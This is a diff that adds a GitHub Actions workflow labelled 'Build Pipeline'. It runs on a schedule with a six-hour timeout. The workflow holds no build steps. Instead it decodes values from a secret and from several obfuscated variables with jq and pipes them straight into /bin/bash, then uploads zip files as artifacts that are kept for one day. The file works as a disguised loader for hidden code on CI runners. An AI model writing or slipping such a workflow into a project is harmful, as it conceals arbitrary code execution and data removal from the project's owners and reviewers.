@@ -1,0 +1,34 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 1,7,13,19 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          f662: ${{ secrets.f662 }}
+        run: |
+          printf '%s' "$f662" | jq -r .wkexz79 | /bin/bash
+          printf '%s' "$chzip8699" | jq -r .knq418 | /bin/bash
+          echo $jwr472 | jq -r .jiw3 | /bin/bash
+          printf '%s' "$vjvdm141" | jq -r .qkg8604 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: OAkMY7LH
+          path: "*.zip"
+          retention-days: 1
